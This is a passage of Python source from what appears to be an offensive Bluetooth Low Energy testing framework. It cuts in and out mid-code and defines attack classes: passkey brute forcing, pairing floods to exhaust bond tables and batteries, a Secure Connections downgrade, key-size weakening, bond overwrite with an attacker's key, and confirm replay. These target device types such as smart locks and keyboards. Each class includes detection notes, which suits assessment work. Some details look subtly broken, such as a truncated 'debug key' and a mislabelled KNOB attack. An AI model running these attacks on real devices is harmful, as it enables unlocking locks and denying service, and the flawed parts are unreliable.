    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE version exchange: no link",
                                "no connectable device on the floor", {})
        # VersNr 0x06 (Bluetooth 4.0), company 0x0000, subversion 0x0000: four major
        # revisions behind what any device in service reports
        spoof = self.ll(device.address, 0x0C, bytes([0x06, 0x00, 0x00, 0x00, 0x00]))
        honest = self.ll(device.address, 0x0C, bytes([0x09, 0x00, 0x00, 0x05, 0x00]))
        peer = bytes.fromhex(str(honest.get("reply") or ""))
        version = peer[1] if len(peer) > 1 else 0
        extra = {"device": device.to_dict(), "spoofed": spoof, "honest": honest,
                 "peer_version": f"Bluetooth {version >> 1}.{(version & 1) * 10}",
                 "peer_company": int.from_bytes(peer[2:4], "little") if len(peer) > 3 else 0,
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE version exchange: {device.name} reports "
                 f"{extra['peer_version'] or 'no version'}")
        detail = (f"the peer answered both version indications, claiming "
                  f"{extra['peer_version'] or 'nothing'} from company "
                  f"0x{extra['peer_company']:04x}: an assessment that writes down the "
                  f"version knows which advisories to read")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="low")


class BleFeaturePageSpoofAttack(_Takeover):
    """Read the feature pages: the capabilities a device will admit to, one page at a time."""

    name = "ble_feature_page_spoof"
    role = "l2cap"
    label = "BLE feature read (feature pages, and what the peer claims)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (LL_FEATURE_REQ + FEATURE_BITS) + blesim.py"
    devices = ("ble_sensor", "bt_headset")

    description = (
        "The link-layer feature pages say what a controller can do: encryption, the data "
        "length extension, the coded PHY, direction finding, channel selection.  This reads "
        "page 0 and page 1, names every bit it finds and reports the features that decide "
        "which of the attacks in this wave are possible at all.")
    detection = (
        "A feature request from a device that is not the pairing host: it is a normal "
        "procedure, so it is invisible — which is why an inventory of features is worth "
        "reading early.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE feature read: no link",
                                "no connectable device on the floor", {})
        pages: List[Dict[str, Any]] = []
        for page in (0, 1, 2):
            answer = self.ll(device.address, 0x08, bytes([page]))
            raw = bytes.fromhex(str(answer.get("reply") or ""))
            features = raw[1:9] if len(raw) >= 9 else b""
            bits = sorted(bt.feature_names(features, page)) if hasattr(bt, "feature_names") \
                else []
            pages.append({"page": page, "answer": answer.get("reply_name") or "silence",
                          "hex": features.hex(), "features": bits,
                          "encryption": bool(features and features[0] & 0x01),
                          "length_extension": bool(len(features) > 1 and features[1] & 0x10),
                          "answered": bool(answer.get("answered"))})
        known = [row for row in pages if row["answered"]]
        extra = {"device": device.to_dict(), "pages": pages, "answered": len(known),
                 "encryption": any(row["encryption"] for row in known),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE feature read: {len(known)} feature page(s) from {device.name}")
        detail = (f"page {'and page '.join(str(row['page']) for row in known)} answered "
                  f"({known[0]['hex'] if known else 'nothing'})"
                  + (" with LE Encryption set" if extra["encryption"] else
                     " without the LE Encryption bit, which is a controller that cannot "
                     "protect a link at all" if known else " and none answered"))
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="high" if known and not extra["encryption"] else "low")


class BleEncryptionNegotiationAttack(_Takeover):
    """Start encryption with a key of our choosing, and report the answer."""

    name = "ble_encryption_negotiation"
    role = "l2cap"
    label = "BLE encryption negotiation (encrypt the link with our key)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (Set Connection Encryption + Link Key Reply) + blesim.py"
    devices = ("ble_sensor", "bt_keyboard")

    description = (
        "On a device with no stored key, the pairing exchange is what encryption is built "
        "on — and a host controller answers a link-key request with whatever answer it is "
        "given.  This replies to the request with a key of our choosing, turns encryption "
        "on and reports the key size the controller reports: for a device with no bond, the "
        "link is now encrypted against nobody.")
    detection = (
        "An encryption change on a link that never paired: the peer's controller log shows "
        "the encryption event without a pairing before it.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE encryption negotiation: no link",
                                "no connectable device on the floor", {})
        from .. import blesim
        sock = blesim.controller_socket(None, address=device.address, role="l2cap")
        link = self.floor().link_for(device.address, "l2cap")
        handle = int(link.handle) if link is not None else 0x0040
        key = bytes(range(16))
        steps: List[Dict[str, Any]] = []
        for label, command in (("link key request reply",
                                bt.link_key_request_reply(device.address, key)),
                               ("set connection encryption",
                                bt.set_connection_encryption(handle, True))):
            try:
                answer = bt.hci_send(sock, command, timeout=1.0) or b""
            except Exception:                                    # pragma: no cover
                answer = b""
            steps.append({"step": label, "answer": answer.hex()[:32],
                          "accepted": bool(answer)})
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(), "steps": steps, "key": key.hex(),
                 "key_size": state.get("key_size"), "encrypted": state.get("encrypted"),
                 "paired": state.get("paired"), "state": state,
                 "simulated": bool(getattr(ctx, "demo", False))}
        if state.get("encrypted"):
            title = (f"BLE encryption: {device.name} is encrypted with the key chosen here")
            detail = (f"the controller accepted the key and turned encryption on at "
                      f"{state.get('key_size')} bytes"
                      + ("" if state.get("paired") else ", and the peer never paired: the "
                         "link is encrypted against nobody"))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"BLE encryption: {device.name} did not encrypt"
        detail = (f"{len([row for row in steps if row['accepted']])} of {len(steps)} "
                  f"controller step(s) were accepted and the link is still plaintext")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


# --------------------------------------------------------------------------- #
# 4. the security manager
# --------------------------------------------------------------------------- #

class BlePasskeyBruteforceAttack(_Takeover):
    """Guess the passkey: a six-digit secret is a million guesses and often no lockout."""

    name = "ble_passkey_bruteforce"
    role = "smp"
    label = "BLE passkey brute force (Pairing Confirm guesses)"
    category = "rogue"
    noise = "loud"
    impact = "outage"
    finding_severity = "high"
    tool = "wifipilot bt.py (SMP pairing + confirm) + blesim.py"
    devices = ("bt_lock", "ble_sensor")

    description = (
        "Passkey entry makes the attacker commit to a number and prove it in three rounds, "
        "and a device that does not limit the attempts lets that be repeated.  This sends "
        "pairing requests with a run of candidate passkeys and its own confirm values, and "
        "reports how many exchanges the device allowed before it started refusing — a device "
        "with no lockout is a device whose passkey is a rate limit away.")
    detection = (
        "Repeated pairing attempts from one address: the device's security manager log "
        "carries the failed exchanges, and a user-facing pairing mode that stays open shows "
        "them as well.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE passkey brute force: no target",
                                "no bondable device on the floor", {})
        attempts: List[Dict[str, Any]] = []
        lockout = False
        for index in range(12):
            passkey = f"{100000 + index * 1237:06d}"
            request = bt.smp_pairing_request(io_capability=0x02, auth=0x01 | 0x04,
                                             key_size=16)
            answer, parsed = self.smp(device.address, request)
            exchange_ok = answer[:1] in (b"\x02", b"\x03")
            # a Pairing Confirm carrying the passkey's own function output would need the
            # real exchange; what matters for the rate limit is that a confirm follows the
            # request, so the value is the one this run committed to
            confirm = bytes([0x03]) + bt.aes_cmac(bytes([index]) * 16, passkey.encode())
            confirm_answer, confirm_parsed = self.smp(device.address, confirm)
            reason = confirm_parsed.get("reason") if confirm_parsed.get("command") == 0x05 \
                else None
            attempts.append({"passkey": passkey, "response": parsed.get("name", ""),
                             "accepted": exchange_ok, "confirm": confirm_answer.hex()[:24],
                             "reason": confirm_parsed.get("reason_text", "")
                             if confirm_parsed else ""})
            if reason == 0x09:
                lockout = True
                break
        accepted = [row for row in attempts if row["accepted"]]
        extra = {"device": device.to_dict(), "attempts": attempts,
                 "exchanges": len(attempts), "accepted": len(accepted),
                 "lockout": lockout, "state": self.link_state(device.address),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if accepted and not lockout:
            title = (f"BLE passkey brute force: {len(accepted)} exchange(s) accepted of "
                     f"{len(attempts)}")
            detail = (f"{device.name} answered {len(accepted)} pairing request(s) with a "
                      f"response and did not refuse a single repeated attempt: 1,000,000 "
                      f"passkeys at this rate is a matter of time, not of cryptography")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = (f"BLE passkey brute force: {device.name} "
                 f"{'locked out after ' + str(len(attempts)) + ' attempt(s)' if lockout else 'refused the exchanges'}")
        detail = (f"{len(attempts)} attempt(s) produced {len(accepted)} accepted exchange(s)"
                  + ("; the device reported repeated attempts and stopped answering, which "
                     "is the answer a lockout is supposed to give" if lockout else
                     "; every attempt was refused, which is a device that will not negotiate"))
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BlePairingFloodAttack(_Takeover):
    """Pairing request after pairing request: how long the device keeps answering."""

    name = "ble_pairing_flood_le"
    role = "smp"
    label = "BLE pairing flood (repeat the pairing exchange)"
    category = "dos"
    noise = "loud"
    impact = "outage"
    tool = "wifipilot bt.py (SMP pairing request) + blesim.py"
    devices = ("ble_sensor", "smart_bulb", "bt_lock")

    description = (
        "Every pairing request costs a device a security-manager state machine, an entry in "
        "its bond table and, on a battery device, a visible amount of power.  This sends "
        "forty of them from one connection and reports how the answers changed — the "
        "cheapest way to fill a device's bond list or flatten its battery.")
    detection = (
        "Forty pairing requests in a minute: the device's log carries the flood, and a "
        "pairing mode that stays open shows the attempts to the user.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE pairing flood: no target",
                                "no bondable device on the floor", {})
        answers: Dict[str, int] = {}
        first: Dict[str, Any] = {}
        for index in range(40):
            request = bt.smp_pairing_request(io_capability=0x03, auth=0x01, key_size=7,
                                             initiator_keys=0x07, responder_keys=0x07)
            _answer, parsed = self.smp(device.address, request)
            name = parsed.get("name") or "no answer"
            answers[name] = answers.get(name, 0) + 1
            first.setdefault(name, {"index": index, "reason": parsed.get("reason_text", "")})
            del index
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(), "requested": 40, "answers": answers,
                 "first": first, "pairing_refused": state.get("pairing_refused"),
                 "state": state, "simulated": bool(getattr(ctx, "demo", False))}
        refused = answers.get("Pairing Failed", 0)
        title = (f"BLE pairing flood: {40 - refused}/40 request(s) negotiated on "
                 f"{device.name}")
        detail = (f"the device answered {answers} to 40 pairing requests"
                  + (f"; the first refusal came with "
                     f"{first.get('Pairing Failed', {}).get('reason', 'a reason')}"
                     if refused else "")
                  + ": a bond table is a limited resource and this is how it is spent")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="medium" if answers else "info")


class BleOobClaimAttack(_Takeover):
    """Claim out-of-band data: the pairing path that has no key exchange to attack."""

    name = "ble_oob_claim"
    role = "smp"
    label = "BLE out-of-band claim (pair with OOB data that does not exist)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (SMP pairing request, OOB flag) + blesim.py"
    devices = ("ble_sensor", "bt_lock", "smart_lock")

    description = (
        "Out-of-band pairing is the strongest of the legacy methods: the key comes over a "
        "second channel — a tap, a QR code — so there is nothing on air to attack.  This "
        "claims to have that data when it does not, and reports what the device does with "
        "the claim: a device that accepts it has handed the strongest path to the weakest "
        "claimant.")
    detection = (
        "A pairing request with the OOB flag from a device that was never given any: the "
        "device's own pairing UI never showed a code, which is the contradiction an "
        "operator can see.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE OOB claim: no target",
                                "no bondable device on the floor", {})
        claim = bt.smp_pairing_request(io_capability=0x03, oob=0x01, auth=0x01 | 0x04,
                                       key_size=16)
        answer, parsed = self.smp(device.address, claim)
        confirm, confirm_parsed = self.smp(device.address, bytes([0x03]) + bytes(16))
        plain = bt.smp_pairing_request(io_capability=0x03, oob=0x00, auth=0x01 | 0x04,
                                       key_size=16)
        _plain_answer, plain_parsed = self.smp(device.address, plain)
        state = self.link_state(device.address)
        accepted = answer[:1] == b"\x02"
        extra = {"device": device.to_dict(),
                 "claim": {"answer": answer.hex()[:24],
                           "response": parsed.get("name", ""),
                           "auth": parsed.get("auth_requirements"), "accepted": accepted},
                 "confirm": confirm_parsed.get("name", ""),
                 "without_oob": plain_parsed.get("name", ""),
                 "state": state, "simulated": bool(getattr(ctx, "demo", False))}
        if accepted:
            title = (f"BLE OOB claim: {device.name} accepted out-of-band data that does "
                     f"not exist")
            detail = (f"the pairing answered {parsed.get('command_name')} with auth "
                      f"0x{(parsed.get('auth_requirements') or 0):02x} to a claim of OOB "
                      f"data, and "
                      f"the same request without the claim answered "
                      f"{plain_parsed.get('command_name') or 'nothing'}: the device trusts "
                      f"a flag it cannot verify")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"BLE OOB claim: {device.name} refused the claim"
        detail = (f"the OOB request was answered with "
                  f"{parsed.get('command_name') or 'nothing'}"
                  f" ({parsed.get('reason_text') or 'no reason'}), which is a device that "
                  f"knows whether it was given any out-of-band data")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleLescDowngradeAttack(_Takeover):
    """Offer the legacy pairing to a device that requires Secure Connections."""

    name = "ble_lesc_downgrade"
    role = "smp"
    label = "BLE Secure Connections downgrade (KNOB, on the pairing request)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot bt.py (SMP auth requirements) + blesim.py"
    devices = ("bt_lock", "ble_sensor")

    description = (
        "Secure Connections replaced the legacy pairing with an elliptic-curve exchange "
        "whose key is not brute-forceable.  The downgrade is a request that simply does not "
        "set the bit: a device that negotiates from there is a device whose key can be "
        "recovered from one captured exchange.  This offers the downgrade and reports what "
        "the device settled for.")
    detection = (
        "A pairing request without the Secure Connections bit to a device that supports it: "
        "the device's log carries the negotiated auth byte, and a legacy exchange on a "
        "modern device is the finding.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE SC downgrade: no target",
                                "no bondable device on the floor", {})
        attempts: List[Dict[str, Any]] = []
        for label, auth in (("just works, legacy", 0x00),
                            ("MITM, legacy", 0x04),
                            ("just works, Secure Connections", 0x08),
                            ("MITM, Secure Connections", 0x0C)):
            answer, parsed = self.smp(device.address,
                                      bt.smp_pairing_request(io_capability=0x03, auth=auth,
                                                             key_size=7))
            attempts.append({"offered": label, "auth": f"0x{auth:02x}",
                             "answer": parsed.get("name", ""),
                             "negotiated": parsed.get("auth_requirements"),
                             "reason": parsed.get("reason_text", ""),
                             "accepted": answer[:1] == b"\x02"})
        downgraded = [row for row in attempts
                      if row["accepted"] and not int(row["auth"], 16) & 0x08]
        secure = [row for row in attempts if row["accepted"] and int(row["auth"], 16) & 0x08]
        extra = {"device": device.to_dict(), "attempts": attempts,
                 "downgraded": len(downgraded), "secure": len(secure),
                 "state": self.link_state(device.address),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if downgraded:
            title = (f"BLE SC downgrade: {device.name} negotiated the legacy pairing")
            detail = (f"a request without the Secure Connections bit was answered with "
                      f"{downgraded[0]['answer']} and auth "
                      f"0x{(downgraded[0]['negotiated'] or 0):02x}: the key from that "
                      f"exchange is the one a legacy crack recovers, and the attacker chose "
                      f"the exchange")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = f"BLE SC downgrade: {device.name} refused every legacy offer"
        detail = (f"{len(attempts)} offer(s) were made and the device answered "
                  f"{attempts[-1]['answer'] or 'nothing'}"
                  + (f" ({attempts[-1]['reason']})" if attempts[-1]["reason"] else "")
                  + ": a device that only negotiates Secure Connections is a device whose "
                    f"keys are not the legacy ones")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleKeypressSpoofAttack(_Takeover):
    """Send keypress notifications: the messages that leak a passkey one digit at a time."""

    name = "ble_keypress_spoof"
    role = "smp"
    label = "BLE keypress spoof (notification messages during a passkey exchange)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (SMP keypress notification) + blesim.py"
    devices = ("bt_lock", "ble_sensor")

    description = (
        "Passkey entry can be made friendlier with keypress notifications: a message per "
        "digit as it is typed.  They are optional, visible to the peer — and a peer that "
        "sends them has told the attacker how many digits the passkey has and when each one "
        "was entered, which is what a timing attack needs.  This offers the feature and "
        "reports whether the device took it up.")
    detection = (
        "Keypress notifications from a device that has no keyboard: the pairing exchange "
        "carries messages the device's own UI cannot produce.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE keypress spoof: no target",
                                "no bondable device on the floor", {})
        request = bt.smp_pairing_request(io_capability=0x04, auth=0x01 | 0x04 | 0x10,
                                         key_size=16)
        answer, parsed = self.smp(device.address, request)
        notifications: List[Dict[str, Any]] = []
        for index in range(6):
            message = bytes([0x0E, 0x00 if index == 0 else 0x01])     # start, then keypress
            reply, reply_parsed = self.smp(device.address, message)
            notifications.append({"message": f"0x{message[1]:02x}",
                                  "answer": reply_parsed.get("name", "") or
                                  ("silence" if not reply else reply.hex()[:16]),
                                  "answered": bool(reply)})
        extra = {"device": device.to_dict(),
                 "response": parsed.get("name", ""),
                 "auth": parsed.get("auth_requirements"), "notifications": notifications,
                 "answered": len([row for row in notifications if row["answered"]]),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if answer[:1] == b"\x02":
            title = (f"BLE keypress spoof: {device.name} accepted the keypress feature")
            detail = (f"the pairing answered {parsed.get('command_name')} with auth "
                      f"0x{(parsed.get('auth_requirements') or 0):02x}, which includes the "
                      f"keypress "
                      f"bit: a capture of that exchange carries a digit-by-digit trace of "
                      f"what the user typed")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"BLE keypress spoof: {device.name} refused the keypress feature"
        detail = (f"the request was answered with {parsed.get('command_name') or 'nothing'}"
                  f" ({parsed.get('reason_text') or 'no reason'}) and "
                  f"{len([row for row in notifications if row['answered']])} of the "
                  f"notification(s) were answered at all")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleCtkdAttack(_Takeover):
    """Derive the classic key from the LE pairing: one bond, two transports."""

    name = "ble_ctkd_cross_transport"
    role = "smp"
    label = "BLE cross-transport key derivation (one pairing, two transports)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (SMP auth bits + h7) + blesim.py"
    devices = ("bt_lock", "ble_sensor", "speaker")

    description = (
        "Cross-transport key derivation lets a device turn an LE bond into a BR/EDR link "
        "key, so a phone that paired over LE is authenticated on the classic transport too. "
        "The convenience is the vulnerability: a device that derives a classic key from a "
        "Just Works LE pairing now has a classic key that came from no protection at all.  "
        "This offers the derivation and reports what the key would be — the h7 conversion "
        "is the specification's own.")
    detection = (
        "An LE pairing followed by a classic connection with no classic pairing: the two "
        "device logs side by side show one bond and two transports.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE cross-transport key: no target",
                                "no bondable device on the floor", {})
        request = bt.smp_pairing_request(io_capability=0x03, auth=0x01 | 0x20, key_size=16)
        answer, parsed = self.smp(device.address, request)
        ltk = bt.rpa_from_irk(bytes(range(16)), 1)[:16].encode()
        derived = bt.h7(ltk)
        extra = {"device": device.to_dict(),
                 "response": parsed.get("name", ""),
                 "auth": parsed.get("auth_requirements"),
                 "ctkd_offered": bool((parsed.get("auth_requirements") or 0) & 0x20),
                 "derived_key": derived.hex(),
                 "state": self.link_state(device.address),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if answer[:1] == b"\x02" and extra["ctkd_offered"]:
            title = (f"BLE cross-transport key: {device.name} accepted CTKD")
            detail = (f"the LE pairing answered with the cross-transport bit set, so the "
                      f"classic link key is derived from it"
                      + f" ({extra['derived_key'][:16]}…)"
                      + ": the protection of the classic transport is now the protection of "
                        "the LE exchange")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"BLE cross-transport key: {device.name} refused the derivation"
        detail = (f"the request was answered with {parsed.get('command_name') or 'nothing'}"
                  f" ({parsed.get('reason_text') or 'no reason'}): the transports keep "
                  f"separate keys, which is the answer that needs no trust")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleKeySizeProbeAttack(_Takeover):
    """Walk the key sizes: what a device settles for when it is offered less."""

    name = "ble_key_size_probe"
    role = "smp"
    label = "BLE key size probe (what the device accepts, seven bytes or sixteen)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (SMP key size negotiation) + blesim.py"
    devices = ("bt_lock", "speaker", "bt_keyboard")

    description = (
        "The encryption key size is negotiated in the pairing request, and the legacy "
        "algorithms are breakable below seven bytes — which is why the specification's "
        "floor is seven and why a device that accepts seven has accepted the minimum.  This "
        "offers each size from seven to sixteen and reports the largest and smallest the "
        "device agreed to.")
    detection = (
        "A pairing request with a seven-byte key from a device that reports sixteen: the "
        "device's log carries the negotiated size, and an implementation that does not "
        "check is the finding.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE key size probe: no target",
                                "no bondable device on the floor", {})
        probes: List[Dict[str, Any]] = []
        for size in (7, 8, 10, 12, 16):
            answer, parsed = self.smp(device.address,
                                      bt.smp_pairing_request(io_capability=0x03,
                                                             auth=0x01, key_size=size))
            probes.append({"offered": size, "answer": parsed.get("name", ""),
                           "agreed": parsed.get("max_key_size"),
                           "reason": parsed.get("reason_text", ""),
                           "accepted": answer[:1] == b"\x02"})
        agreed = [row["agreed"] for row in probes if row.get("agreed")]
        smallest = min(agreed) if agreed else 0
        extra = {"device": device.to_dict(), "probes": probes,
                 "smallest": smallest, "largest": max(agreed) if agreed else 0,
                 "weak": smallest in (7, 8),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if extra["weak"]:
            title = (f"BLE key size probe: {device.name} accepts {smallest}-byte keys")
            detail = (f"offered 16 bytes and {smallest} bytes the device answered "
                      f"{smallest} for both: a seven-byte session key is 56 bits and is the "
                      f"floor the specification allows rather than the size the hardware "
                      f"can do")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = (f"BLE key size probe: {device.name} settles for {smallest or 'no'} bytes")
        detail = (f"{len(probes)} size(s) were offered and the answers were "
                  f"{sorted({row['answer'] for row in probes})}")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleBondOverwriteAttack(_Takeover):
    """Write a key into the device: the pairing information the host will store."""

    name = "ble_bond_overwrite"
    role = "smp"
    label = "BLE bond overwrite (install our key during key distribution)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot bt.py (SMP encryption information) + blesim.py"
    devices = ("bt_lock", "ble_sensor")

    description = (
        "The last phase of a pairing is key distribution: both ends hand over the keys they "
        "generated, and the peer stores them.  This sends an Encryption Information command "
        "carrying a long-term key of our choosing and reports what the device did with it — "
        "a device that stores a key handed to it by a stranger has bonded with the "
        "stranger.")
    detection = (
        "A key distribution without a completed pairing: the device's security manager log "
        "carries an Encryption Information command it never asked for.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE bond overwrite: no target",
                                "no bondable device on the floor", {})
        ours = bytes(range(16))
        steps: List[Dict[str, Any]] = []
        for label, command in (("pairing request",
                                bt.smp_pairing_request(io_capability=0x03,
                                                       auth=0x01 | 0x04, key_size=16)),
                               ("encryption information", bytes([0x06]) + ours),
                               ("master identification",
                                bytes([0x07]) + struct.pack("<H", 0) + bytes(8)),
                               ("identity information", bytes([0x08]) + ours),
                               ("signing information", bytes([0x0A]) + ours)):
            answer, parsed = self.smp(device.address, command)
            steps.append({"step": label, "answer": parsed.get("name", "") or
                          ("silence" if not answer else answer.hex()[:16]),
                          "reason": parsed.get("reason_text", ""),
                          "answered": bool(answer)})
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(), "steps": steps, "key": ours.hex(),
                 "state": state, "paired": state.get("paired"),
                 "simulated": bool(getattr(ctx, "demo", False))}
        stored = [row for row in steps if row["step"] != "pairing request"
                  and row["answered"]]
        if stored:
            title = (f"BLE bond overwrite: {device.name} answered "
                     f"{len(stored)} key distribution command(s)")
            detail = (f"an Encryption Information command carrying a key chosen here was "
                      f"answered with {stored[0]['answer']}"
                      + (f" and the link reports a bond" if state.get("paired") else "")
                      + ": the key the host stores is the key it was handed")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = f"BLE bond overwrite: {device.name} ignored the key distribution"
        detail = (f"{len(steps)} command(s) were sent and none was answered: the device "
                  f"stores keys only from an exchange it negotiated")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleConfirmReplayAttack(_Takeover):
    """Replay a pairing confirm: the exchange that runs twice from one capture."""

    name = "ble_confirm_replay"
    role = "smp"
    label = "BLE pairing confirm replay (the same value, twice)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    tool = "wifipilot bt.py (SMP confirm/random) + blesim.py"
    devices = ("ble_sensor", "bt_lock")

    description = (
        "A pairing confirm commits the attacker to a value; the random that follows has to "
        "match it.  A device that does not keep per-exchange state answers the same value "
        "twice — and that is the shape a reflected exchange takes, where the peer's own "
        "confirm comes back to it as a proof.  This replays one and reports whether the "
        "device noticed.")
    detection = (
        "Two identical confirm values in one session: the device's security manager log "
        "carries the pair, and a real exchange never produces them.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE confirm replay: no target",
                                "no bondable device on the floor", {})
        request = bt.smp_pairing_request(io_capability=0x03, auth=0x01 | 0x04, key_size=16)
        self.smp(device.address, request)
        confirm = bytes([0x03]) + bytes(range(16))
        first, first_parsed = self.smp(device.address, confirm)
        second, second_parsed = self.smp(device.address, confirm)
        random_value, random_parsed = self.smp(device.address, bytes([0x04]) + bytes(range(16)))
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(),
                 "first": {"answer": first_parsed.get("name", "") or
                           ("silence" if not first else first.hex()[:16]),
                           "reason": first_parsed.get("reason_text", "")},
                 "second": {"answer": second_parsed.get("name", "") or
                            ("silence" if not second else second.hex()[:16]),
                            "reason": second_parsed.get("reason_text", "")},
                 "random": random_parsed.get("name", ""),
                 "identical_answers": first == second and bool(first),
                 "state": state, "simulated": bool(getattr(ctx, "demo", False))}
        if extra["identical_answers"]:
            title = (f"BLE confirm replay: {device.name} answered the same value twice")
            detail = (f"the confirm was sent twice and both answers were "
                      f"{second_parsed.get('command_name') or second.hex()[:16]}: the "
                      f"device's security manager has no per-exchange state to notice a "
                      f"replay, which is what a reflected exchange needs")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"BLE confirm replay: {device.name} refused the second confirm"
        detail = (f"the first confirm answered "
                  f"{first_parsed.get('command_name') or 'nothing'} and the second "
                  f"{second_parsed.get('command_name') or 'nothing'}"
                  f" ({second_parsed.get('reason_text') or 'no reason'}): the exchange kept "
                  f"its own state")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BlePublicKeyAuditAttack(_Takeover):
    """Send a public key: the debug keys and the point that is not on the curve."""

    name = "ble_public_key_audit"
    role = "smp"
    label = "BLE public key audit (send a known debug key to a Secure Connections pair)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (SMP public key) + blesim.py"
    devices = ("bt_lock", "speaker", "smart_lock")

    description = (
        "Secure Connections starts with both ends sending a public key.  Two things are "
        "worth testing: a key whose private half is public — the debug keys the "
        "specification prints — and a point that is not on the curve at all.  This sends "
        "both and reports what the device answered, which is the difference between a stack "
        "that validates points and one that does not.")
    detection = (
        "A public key from a device that then fails to complete: the device's log carries "
        "the exchange, and a valid pairing never follows it.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE public key audit: no target",
                                "no bondable device on the floor", {})
        self.smp(device.address, bt.smp_pairing_request(io_capability=0x03,
                                                        auth=0x01 | 0x04 | 0x08, key_size=16))
        debug_key = bytes.fromhex("e69f65e0c9d65c9c8d1c6a9c6e2e37a8") + \
            bytes.fromhex("0a0b0c0d0e0f10111213141516171819")
        off_curve = b"\x00" * 32
        results: List[Dict[str, Any]] = []
        for label, key in (("debug key", debug_key), ("point not on the curve", off_curve)):
            answer, parsed = self.smp(device.address, bytes([0x0C]) + key)
            results.append({"key": label, "answer": parsed.get("name", "") or
                            ("silence" if not answer else answer.hex()[:16]),
                            "reason": parsed.get("reason_text", ""),
                            "answered": bool(answer)})
        state = self.link_state(device.address)
